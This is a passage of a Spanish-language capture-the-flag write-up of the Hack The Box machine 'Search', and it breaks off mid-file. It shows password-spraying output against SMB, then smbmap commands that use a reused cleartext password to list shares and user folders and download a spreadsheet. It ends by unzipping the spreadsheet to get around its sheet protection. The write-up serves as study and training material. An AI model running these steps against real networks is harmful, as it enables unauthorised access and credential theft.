SMB         search.htb      445    RESEARCH         <span class="o">[</span>-] search.htb<span class="se">\E</span>dith.Walls:@3ONEmillionbaby STATUS_LOGON_FAILURE
SMB         search.htb      445    RESEARCH         <span class="o">[</span>-] search.htb<span class="se">\L</span>ane.Wu:@3ONEmillionbaby STATUS_LOGON_FAILURE
SMB         search.htb      445    RESEARCH         <span class="o">[</span>-] search.htb<span class="se">\A</span>rielle.Schultz:@3ONEmillionbaby STATUS_LOGON_FAILURE
SMB         search.htb      445    RESEARCH         <span class="o">[</span>-] search.htb<span class="se">\B</span>obby.Wolf:@3ONEmillionbaby STATUS_LOGON_FAILURE
SMB         search.htb      445    RESEARCH         <span class="o">[</span>-] search.htb<span class="se">\B</span>laine.Zavala:@3ONEmillionbaby STATUS_LOGON_FAILURE
SMB         search.htb      445    RESEARCH         <span class="o">[</span>-] search.htb<span class="se">\M</span>argaret.Robinson:@3ONEmillionbaby STATUS_LOGON_FAILURE
SMB         search.htb      445    RESEARCH         <span class="o">[</span>-] search.htb<span class="se">\C</span>elia.Moreno:@3ONEmillionbaby STATUS_LOGON_FAILURE
SMB         search.htb      445    RESEARCH         <span class="o">[</span>-] search.htb<span class="se">\K</span>aitlynn.Lee:@3ONEmillionbaby STATUS_LOGON_FAILURE
SMB         search.htb      445    RESEARCH         <span class="o">[</span>-] search.htb<span class="se">\K</span>yler.Arias:@3ONEmillionbaby STATUS_LOGON_FAILURE
SMB         search.htb      445    RESEARCH         <span class="o">[</span>-] search.htb<span class="se">\S</span>aniyah.Roy:@3ONEmillionbaby STATUS_LOGON_FAILURE
SMB         search.htb      445    RESEARCH         <span class="o">[</span>-] search.htb<span class="se">\S</span>arai.Boone:@3ONEmillionbaby STATUS_LOGON_FAILURE
SMB         search.htb      445    RESEARCH         <span class="o">[</span>-] search.htb<span class="se">\J</span>ermaine.Franco:@3ONEmillionbaby STATUS_LOGON_FAILURE
SMB         search.htb      445    RESEARCH         <span class="o">[</span>-] search.htb<span class="se">\A</span>lfred.Chan:@3ONEmillionbaby STATUS_LOGON_FAILURE
SMB         search.htb      445    RESEARCH         <span class="o">[</span>-] search.htb<span class="se">\J</span>amar.Holt:@3ONEmillionbaby STATUS_LOGON_FAILURE
SMB         search.htb      445    RESEARCH         <span class="o">[</span>-] search.htb<span class="se">\S</span>andra.Wolfe:@3ONEmillionbaby STATUS_LOGON_FAILURE
SMB         search.htb      445    RESEARCH         <span class="o">[</span>-] search.htb<span class="se">\R</span>ene.Larson:@3ONEmillionbaby STATUS_LOGON_FAILURE
SMB         search.htb      445    RESEARCH         <span class="o">[</span>-] search.htb<span class="se">\Y</span>areli.Mcintyre:@3ONEmillionbaby STATUS_LOGON_FAILURE
SMB         search.htb      445    RESEARCH         <span class="o">[</span>-] search.htb<span class="se">\G</span>riffin.Maddox:@3ONEmillionbaby STATUS_LOGON_FAILURE
SMB         search.htb      445    RESEARCH         <span class="o">[</span>-] search.htb<span class="se">\P</span>rince.Hobbs:@3ONEmillionbaby STATUS_LOGON_FAILURE
SMB         search.htb      445    RESEARCH         <span class="o">[</span>-] search.htb<span class="se">\A</span>rmando.Nash:@3ONEmillionbaby STATUS_LOGON_FAILURE
SMB         search.htb      445    RESEARCH         <span class="o">[</span>-] search.htb<span class="se">\S</span>onia.Schneider:@3ONEmillionbaby STATUS_LOGON_FAILURE
SMB         search.htb      445    RESEARCH         <span class="o">[</span>-] search.htb<span class="se">\M</span>aeve.Mann:@3ONEmillionbaby STATUS_LOGON_FAILURE
SMB         search.htb      445    RESEARCH         <span class="o">[</span>-] search.htb<span class="se">\L</span>izeth.Love:@3ONEmillionbaby STATUS_LOGON_FAILURE
SMB         search.htb      445    RESEARCH         <span class="o">[</span>-] search.htb<span class="se">\A</span>mare.Serrano:@3ONEmillionbaby STATUS_LOGON_FAILURE
SMB         search.htb      445    RESEARCH         <span class="o">[</span>-] search.htb<span class="se">\S</span>avanah.Knox:@3ONEmillionbaby STATUS_LOGON_FAILURE
SMB         search.htb      445    RESEARCH         <span class="o">[</span>-] search.htb<span class="se">\F</span>rederick.Cuevas:@3ONEmillionbaby STATUS_LOGON_FAILURE
SMB         search.htb      445    RESEARCH         <span class="o">[</span>-] search.htb<span class="se">\M</span>arshall.Skinner:@3ONEmillionbaby STATUS_LOGON_FAILURE
SMB         search.htb      445    RESEARCH         <span class="o">[</span>+] search.htb<span class="se">\E</span>dgar.Jacobs:@3ONEmillionbaby
^C
</code></pre></div></div>

<ul>
  <li>
    <p>Y bueno el usuario <code class="language-plaintext highlighter-rouge">Edgar.Jacobs</code> reutiliza la misma contraseña.</p>
  </li>
  <li>
    <p>Vamos a listar los recursos compartidos por <code class="language-plaintext highlighter-rouge">smb</code> para el usuario <code class="language-plaintext highlighter-rouge">Edgar.Jacobs</code>.</p>
  </li>
  <li>
    <p>Vemos el <code class="language-plaintext highlighter-rouge">RedirectedFolders$</code> otra vez.</p>
  </li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content smbmap <span class="nt">-H</span> 10.129.229.57 <span class="nt">-u</span> <span class="s1">'Edgar.Jacobs'</span> <span class="nt">-p</span> <span class="s1">'@3ONEmillionbaby'</span> <span class="nt">--no-banner</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Detected 1 hosts serving SMB
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Established 1 SMB session<span class="o">(</span>s<span class="o">)</span>

<span class="o">[</span>+] IP: 10.129.229.57:445	Name: search.htb          	Status: Authenticated
	Disk                                                  	Permissions	Comment
	<span class="nt">----</span>                                                  	<span class="nt">-----------</span>	<span class="nt">-------</span>
	ADMIN<span class="nv">$ </span>                                           	NO ACCESS	Remote Admin
	C<span class="nv">$ </span>                                               	NO ACCESS	Default share
	CertEnroll                                        	READ ONLY	Active Directory Certificate Services share
	helpdesk                                          	READ ONLY	
	IPC<span class="nv">$ </span>                                             	READ ONLY	Remote IPC
	NETLOGON                                          	READ ONLY	Logon server share
	RedirectedFolders<span class="nv">$ </span>                               	READ, WRITE	
	SYSVOL                                            	READ ONLY	Logon server share
</code></pre></div></div>

<ul>
  <li>Vamos a ver lo que hay dentro.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content smbmap <span class="nt">-H</span> 10.129.229.57 <span class="nt">-u</span> <span class="s1">'Edgar.Jacobs'</span> <span class="nt">-p</span> <span class="s1">'@3ONEmillionbaby'</span> <span class="nt">--no-banner</span> <span class="nt">-r</span> <span class="s1">'RedirectedFolders$'</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Detected 1 hosts serving SMB
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Established 1 SMB session<span class="o">(</span>s<span class="o">)</span>

<span class="o">[</span>+] IP: 10.129.229.57:445	Name: search.htb          	Status: Authenticated
	Disk                                                  	Permissions	Comment
	<span class="nt">----</span>                                                  	<span class="nt">-----------</span>	<span class="nt">-------</span>
	ADMIN<span class="nv">$ </span>                                           	NO ACCESS	Remote Admin
	C<span class="nv">$ </span>                                               	NO ACCESS	Default share
	CertEnroll                                        	READ ONLY	Active Directory Certificate Services share
	helpdesk                                          	READ ONLY	
	IPC<span class="nv">$ </span>                                             	READ ONLY	Remote IPC
	NETLOGON                                          	READ ONLY	Logon server share
	RedirectedFolders<span class="nv">$ </span>                               	READ, WRITE	
	./RedirectedFolders<span class="err">$</span>
	dr--r--r--                0 Sun Apr  7 16:59:18 2024	<span class="nb">.</span>
	dr--r--r--                0 Sun Apr  7 16:59:18 2024	..
	dr--r--r--                0 Tue Apr  7 13:12:58 2020	abril.suarez
	dr--r--r--                0 Fri Jul 31 08:11:32 2020	Angie.Duffy
	dr--r--r--                0 Fri Jul 31 07:35:32 2020	Antony.Russo
	dr--r--r--                0 Tue Apr  7 13:32:31 2020	belen.compton
	dr--r--r--                0 Fri Jul 31 07:37:36 2020	Cameron.Melendez
	dr--r--r--                0 Tue Apr  7 13:15:09 2020	chanel.bell
	dr--r--r--                0 Fri Jul 31 08:09:07 2020	Claudia.Pugh
	dr--r--r--                0 Fri Jul 31 07:02:04 2020	Cortez.Hickman
	dr--r--r--                0 Tue Apr  7 13:20:08 2020	dax.santiago
	dr--r--r--                0 Fri Jul 31 06:55:34 2020	Eddie.Stevens
	dr--r--r--                0 Thu Apr  9 15:04:11 2020	edgar.jacobs
	dr--r--r--                0 Fri Jul 31 07:39:50 2020	Edith.Walls
	dr--r--r--                0 Tue Apr  7 13:23:13 2020	eve.galvan
	dr--r--r--                0 Tue Apr  7 13:29:22 2020	frederick.cuevas
	dr--r--r--                0 Thu Apr  9 09:34:41 2020	hope.sharp
	dr--r--r--                0 Tue Apr  7 13:07:00 2020	jayla.roberts
	dr--r--r--                0 Fri Jul 31 08:01:06 2020	Jordan.Gregory
	dr--r--r--                0 Thu Apr  9 15:11:39 2020	payton.harmon
	dr--r--r--                0 Fri Jul 31 06:44:32 2020	Reginald.Morton
	dr--r--r--                0 Tue Apr  7 13:10:25 2020	santino.benjamin
	dr--r--r--                0 Fri Jul 31 07:21:42 2020	Savanah.Velazquez
	dr--r--r--                0 Wed Nov 17 19:01:45 2021	sierra.frye
	dr--r--r--                0 Thu Apr  9 15:14:26 2020	trace.ryan
	SYSVOL                                            	READ ONLY	Logon server share
➜  content
</code></pre></div></div>

<ul>
  <li>Si nos metemos a nuestro directorio vemos que esta el <code class="language-plaintext highlighter-rouge">Desktop</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content smbmap <span class="nt">-H</span> 10.129.229.57 <span class="nt">-u</span> <span class="s1">'Edgar.Jacobs'</span> <span class="nt">-p</span> <span class="s1">'@3ONEmillionbaby'</span> <span class="nt">--no-banner</span> <span class="nt">-r</span> <span class="s1">'RedirectedFolders$/edgar.jacobs/'</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Detected 1 hosts serving SMB
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Established 1 SMB session<span class="o">(</span>s<span class="o">)</span>

<span class="o">[</span>+] IP: 10.129.229.57:445	Name: search.htb          	Status: Authenticated
	Disk                                                  	Permissions	Comment
	<span class="nt">----</span>                                                  	<span class="nt">-----------</span>	<span class="nt">-------</span>
	ADMIN<span class="nv">$ </span>                                           	NO ACCESS	Remote Admin
	C<span class="nv">$ </span>                                               	NO ACCESS	Default share
	CertEnroll                                        	READ ONLY	Active Directory Certificate Services share
	helpdesk                                          	READ ONLY	
	IPC<span class="nv">$ </span>                                             	READ ONLY	Remote IPC
	NETLOGON                                          	READ ONLY	Logon server share
	RedirectedFolders<span class="nv">$ </span>                               	READ, WRITE	
	./RedirectedFolders<span class="nv">$edgar</span>.jacobs/
	dr--r--r--                0 Thu Apr  9 15:04:11 2020	<span class="nb">.</span>
	dr--r--r--                0 Thu Apr  9 15:04:11 2020	..
	dw--w--w--                0 Mon Aug 10 05:02:16 2020	Desktop
	dw--w--w--                0 Mon Aug 10 05:02:17 2020	Documents
	dw--w--w--                0 Mon Aug 10 05:02:17 2020	Downloads
	SYSVOL                                            	READ ONLY	Logon server share
</code></pre></div></div>

<ul>
  <li>Y bueno vemos un <code class="language-plaintext highlighter-rouge">xlsx</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content smbmap <span class="nt">-H</span> 10.129.229.57 <span class="nt">-u</span> <span class="s1">'Edgar.Jacobs'</span> <span class="nt">-p</span> <span class="s1">'@3ONEmillionbaby'</span> <span class="nt">--no-banner</span> <span class="nt">-r</span> <span class="s1">'RedirectedFolders$/edgar.jacobs/Desktop'</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Detected 1 hosts serving SMB
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Established 1 SMB session<span class="o">(</span>s<span class="o">)</span>

<span class="o">[</span>+] IP: 10.129.229.57:445	Name: search.htb          	Status: Authenticated
	Disk                                                  	Permissions	Comment
	<span class="nt">----</span>                                                  	<span class="nt">-----------</span>	<span class="nt">-------</span>
	ADMIN<span class="nv">$ </span>                                           	NO ACCESS	Remote Admin
	C<span class="nv">$ </span>                                               	NO ACCESS	Default share
	CertEnroll                                        	READ ONLY	Active Directory Certificate Services share
	helpdesk                                          	READ ONLY	
	IPC<span class="nv">$ </span>                                             	READ ONLY	Remote IPC
	NETLOGON                                          	READ ONLY	Logon server share
	RedirectedFolders<span class="nv">$ </span>                               	READ, WRITE	
	./RedirectedFolders<span class="nv">$edgar</span>.jacobs/Desktop
	dw--w--w--                0 Mon Aug 10 05:02:16 2020	<span class="nb">.</span>
	dw--w--w--                0 Mon Aug 10 05:02:16 2020	..
	dr--r--r--                0 Thu Apr  9 15:05:29 2020	<span class="nv">$RECYCLE</span>.BIN
	fr--r--r--              282 Mon Aug 10 05:02:16 2020	desktop.ini
	fr--r--r--             1450 Thu Apr  9 15:05:03 2020	Microsoft Edge.lnk
	fr--r--r--            23130 Mon Aug 10 05:30:05 2020	Phishing_Attempt.xlsx
	SYSVOL                                            	READ ONLY	Logon server share
</code></pre></div></div>

<blockquote>
  <p>xlsx. Formato de archivo basado en XML y habilitado para macros de Excel 2007 a 2013. Almacena código de macros de VBA u hojas de macros de Excel 4.0 .</p>
</blockquote>

<ul>
  <li>Vamos a descargarlo para ver que es lo que hay dentro.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  document smbmap <span class="nt">-H</span> 10.129.229.57 <span class="nt">-u</span> <span class="s1">'Edgar.Jacobs'</span> <span class="nt">-p</span> <span class="s1">'@3ONEmillionbaby'</span> <span class="nt">--no-banner</span> <span class="nt">--download</span> <span class="s1">'RedirectedFolders$/edgar.jacobs/Desktop/Phishing_Attempt.xlsx'</span>
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Detected 1 hosts serving SMB
<span class="o">[</span><span class="k">*</span><span class="o">]</span> Established 1 SMB session<span class="o">(</span>s<span class="o">)</span>
<span class="o">[</span>+] Starting download: RedirectedFolders<span class="nv">$\</span>edgar.jacobs<span class="se">\D</span>esktop<span class="se">\P</span>hishing_Attempt.xlsx <span class="o">(</span>23130 bytes<span class="o">)</span>
<span class="o">[</span>+] File output to: /home/miguel/Hackthebox/Search/content/document/10.129.229.57-RedirectedFolders_edgar.jacobs_Desktop_Phishing_Attempt.xlsx
</code></pre></div></div>

<ul>
  <li>Vamos abrirlo con <code class="language-plaintext highlighter-rouge">libreoffice</code>.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/hard/search/7.png" />
</p>

<ul>
  <li>Vemos que la parte de <code class="language-plaintext highlighter-rouge">Passwords</code> esta protegida.</li>
</ul>

<p align="center">
<img src="/assets/hackthebox/img/machines/hard/search/8.png" />
</p>

<ul>
  <li>Vamos aplicar un <code class="language-plaintext highlighter-rouge">Bypass</code>.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  document unzip Phishing_Attempt.xlsx
Archive:  Phishing_Attempt.xlsx
  inflating: <span class="o">[</span>Content_Types].xml
  inflating: _rels/.rels
  inflating: xl/workbook.xml
  inflating: xl/_rels/workbook.xml.rels
  inflating: xl/worksheets/sheet1.xml
  inflating: xl/worksheets/sheet2.xml
  inflating: xl/theme/theme1.xml
  inflating: xl/styles.xml
  inflating: xl/sharedStrings.xml
  inflating: xl/drawings/drawing1.xml
  inflating: xl/charts/chart1.xml
  inflating: xl/charts/style1.xml
  inflating: xl/charts/colors1.xml
  inflating: xl/worksheets/_rels/sheet1.xml.rels
  inflating: xl/worksheets/_rels/sheet2.xml.rels
  inflating: xl/drawings/_rels/drawing1.xml.rels
  inflating: xl/charts/_rels/chart1.xml.rels
  inflating: xl/printerSettings/printerSettings1.bin
  inflating: xl/printerSettings/printerSettings2.bin
  inflating: xl/calcChain.xml
  inflating: docProps/core.xml
  inflating: docProps/app.xml
</code></pre></div></div>

<ul>
  <li>Vemos que <code class="language-plaintext highlighter-rouge">hashValue</code> y mas detalles del archivo protegido.</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  document <span class="nb">cat </span>xl/worksheets/sheet2.xml
&lt;?xml <span class="nv">version</span><span class="o">=</span><span class="s2">"1.0"</span> <span class="nv">encoding</span><span class="o">=</span><span class="s2">"UTF-8"</span> <span class="nv">standalone</span><span class="o">=</span><span class="s2">"yes"</span>?&gt;
&lt;worksheet <span class="nv">xmlns</span><span class="o">=</span><span class="s2">"http://schemas.openxmlformats.org/spreadsheetml/2006/main"</span> xmlns:r<span class="o">=</span><span class="s2">"http://schemas.openxmlformats.org/officeDocument/2006/relationships"</span> xmlns:mc<span class="o">=</span><span class="s2">"http://schemas.openxmlformats.org/markup-compatibility/2006"</span> mc:Ignorable<span class="o">=</span><span class="s2">"x14ac xr xr2 xr3"</span> xmlns:x14ac<span class="o">=</span><span class="s2">"http://schemas.microsoft.com/office/spreadsheetml/2009/9/ac"</span> xmlns:xr<span class="o">=</span><span class="s2">"http://schemas.microsoft.com/office/spreadsheetml/2014/revision"</span> xmlns:xr2<span class="o">=</span><span class="s2">"http://schemas.microsoft.com/office/spreadsheetml/2015/revision2"</span> xmlns:xr3<span class="o">=</span><span class="s2">"http://schemas.microsoft.com/office/spreadsheetml/2016/revision3"</span> xr:uid<span class="o">=</span><span class="s2">"{00000000-0001-0000-0100-000000000000}"</span><span class="o">&gt;</span>&lt;dimension <span class="nv">ref</span><span class="o">=</span><span class="s2">"A1:D17"</span>/&gt;&lt;sheetViews&gt;&lt;sheetView <span class="nv">tabSelected</span><span class="o">=</span><span class="s2">"1"</span> <span class="nv">workbookViewId</span><span class="o">=</span><span class="s2">"0"</span><span class="o">&gt;</span>&lt;selection <span class="nv">activeCell</span><span class="o">=</span><span class="s2">"F19"</span> <span class="nv">sqref</span><span class="o">=</span><span class="s2">"F19"</span>/&gt;&lt;/sheetView&gt;&lt;/sheetViews&gt;&lt;sheetFormatPr <span class="nv">defaultRowHeight</span><span class="o">=</span><span class="s2">"15"</span> x14ac:dyDescent<span class="o">=</span><span class="s2">"0.25"</span>/&gt;&lt;cols&gt;&lt;col <span class="nv">min</span><span class="o">=</span><span class="s2">"1"</span> <span class="nv">max</span><span class="o">=</span><span class="s2">"1"</span> <span class="nv">width</span><span class="o">=</span><span class="s2">"10.140625"</span> <span class="nv">bestFit</span><span class="o">=</span><span class="s2">"1"</span> <span class="nv">customWidth</span><span class="o">=</span><span class="s2">"1"</span>/&gt;&lt;col <span class="nv">min</span><span class="o">=</span><span class="s2">"3"</span> <span class="nv">max</span><span class="o">=</span><span class="s2">"3"</span> <span class="nv">width</span><span class="o">=</span><span class="s2">"37.5703125"</span> <span class="nv">hidden</span><span class="o">=</span><span class="s2">"1"</span> <span class="nv">customWidth</span><span class="o">=</span><span class="s2">"1"</span>/&gt;&lt;col <span class="nv">min</span><span class="o">=</span><span class="s2">"4"</span> <span class="nv">max</span><span class="o">=</span><span class="s2">"4"</span> <span class="nv">width</span><span class="o">=</span><span class="s2">"19.140625"</span> <span class="nv">bestFit</span><span class="o">=</span><span class="s2">"1"</span> <span class="nv">customWidth</span><span class="o">=</span><span class="s2">"1"</span>/&gt;&lt;/cols&gt;&lt;sheetData&gt;&lt;row <span class="nv">r</span><span class="o">=</span><span class="s2">"1"</span> <span class="nv">spans</span><span class="o">=</span><span class="s2">"1:4"</span> x14ac:dyDescent<span class="o">=</span><span class="s2">"0.25"</span><span class="o">&gt;</span>&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"A1"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;0&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"B1"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;1&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"C1"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;2&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"D1"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;31&lt;/v&gt;&lt;/c&gt;&lt;/row&gt;&lt;row <span class="nv">r</span><span class="o">=</span><span class="s2">"2"</span> <span class="nv">spans</span><span class="o">=</span><span class="s2">"1:4"</span> x14ac:dyDescent<span class="o">=</span><span class="s2">"0.25"</span><span class="o">&gt;</span>&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"A2"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;3&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"B2"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;4&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"C2"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;44&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"D2"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"str"</span><span class="o">&gt;</span>&lt;f <span class="nv">t</span><span class="o">=</span><span class="s2">"shared"</span> <span class="nv">ref</span><span class="o">=</span><span class="s2">"D2:D7"</span> <span class="nv">si</span><span class="o">=</span><span class="s2">"0"</span><span class="o">&gt;</span>A2&amp;amp<span class="p">;</span><span class="s2">"."</span>&amp;amp<span class="p">;</span>B2&lt;/f&gt;&lt;v&gt;Payton.Harmon&lt;/v&gt;&lt;/c&gt;&lt;/row&gt;&lt;row <span class="nv">r</span><span class="o">=</span><span class="s2">"3"</span> <span class="nv">spans</span><span class="o">=</span><span class="s2">"1:4"</span> x14ac:dyDescent<span class="o">=</span><span class="s2">"0.25"</span><span class="o">&gt;</span>&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"A3"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;5&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"B3"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;6&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"C3"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;45&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"D3"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"str"</span><span class="o">&gt;</span>&lt;f <span class="nv">t</span><span class="o">=</span><span class="s2">"shared"</span> <span class="nv">si</span><span class="o">=</span><span class="s2">"0"</span>/&gt;&lt;v&gt;Cortez.Hickman&lt;/v&gt;&lt;/c&gt;&lt;/row&gt;&lt;row <span class="nv">r</span><span class="o">=</span><span class="s2">"4"</span> <span class="nv">spans</span><span class="o">=</span><span class="s2">"1:4"</span> x14ac:dyDescent<span class="o">=</span><span class="s2">"0.25"</span><span class="o">&gt;</span>&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"A4"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;7&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"B4"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;8&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"C4"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;46&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"D4"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"str"</span><span class="o">&gt;</span>&lt;f <span class="nv">t</span><span class="o">=</span><span class="s2">"shared"</span> <span class="nv">si</span><span class="o">=</span><span class="s2">"0"</span>/&gt;&lt;v&gt;Bobby.Wolf&lt;/v&gt;&lt;/c&gt;&lt;/row&gt;&lt;row <span class="nv">r</span><span class="o">=</span><span class="s2">"5"</span> <span class="nv">spans</span><span class="o">=</span><span class="s2">"1:4"</span> x14ac:dyDescent<span class="o">=</span><span class="s2">"0.25"</span><span class="o">&gt;</span>&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"A5"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;9&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"B5"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;10&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"C5"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;35&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"D5"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"str"</span><span class="o">&gt;</span>&lt;f <span class="nv">t</span><span class="o">=</span><span class="s2">"shared"</span> <span class="nv">si</span><span class="o">=</span><span class="s2">"0"</span>/&gt;&lt;v&gt;Margaret.Robinson&lt;/v&gt;&lt;/c&gt;&lt;/row&gt;&lt;row <span class="nv">r</span><span class="o">=</span><span class="s2">"6"</span> <span class="nv">spans</span><span class="o">=</span><span class="s2">"1:4"</span> x14ac:dyDescent<span class="o">=</span><span class="s2">"0.25"</span><span class="o">&gt;</span>&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"A6"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;12&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"B6"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;13&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"C6"</span> <span class="nv">s</span><span class="o">=</span><span class="s2">"2"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;36&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"D6"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"str"</span><span class="o">&gt;</span>&lt;f <span class="nv">t</span><span class="o">=</span><span class="s2">"shared"</span> <span class="nv">si</span><span class="o">=</span><span class="s2">"0"</span>/&gt;&lt;v&gt;Scarlett.Parks&lt;/v&gt;&lt;/c&gt;&lt;/row&gt;&lt;row <span class="nv">r</span><span class="o">=</span><span class="s2">"7"</span> <span class="nv">spans</span><span class="o">=</span><span class="s2">"1:4"</span> x14ac:dyDescent<span class="o">=</span><span class="s2">"0.25"</span><span class="o">&gt;</span>&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"A7"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;14&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"B7"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;15&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"C7"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;37&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"D7"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"str"</span><span class="o">&gt;</span>&lt;f <span class="nv">t</span><span class="o">=</span><span class="s2">"shared"</span> <span class="nv">si</span><span class="o">=</span><span class="s2">"0"</span>/&gt;&lt;v&gt;Eliezer.Jordan&lt;/v&gt;&lt;/c&gt;&lt;/row&gt;&lt;row <span class="nv">r</span><span class="o">=</span><span class="s2">"8"</span> <span class="nv">spans</span><span class="o">=</span><span class="s2">"1:4"</span> x14ac:dyDescent<span class="o">=</span><span class="s2">"0.25"</span><span class="o">&gt;</span>&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"A8"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;16&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"B8"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;17&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"C8"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"s"</span><span class="o">&gt;</span>&lt;v&gt;38&lt;/v&gt;&lt;/c&gt;&lt;c <span class="nv">r</span><span class="o">=</span><span class="s2">"D8"</span> <span class="nv">t</span><span class="o">=</span><span class="s2">"str"</span><span class="o">&gt;</span>&lt;f <span class="nv">t</span><span class="o">=</span><span class="s2">"shared"</span> <span class="nv">ref</span><span class="o">=</span><span class="s2">"D8:D15"</span> <span 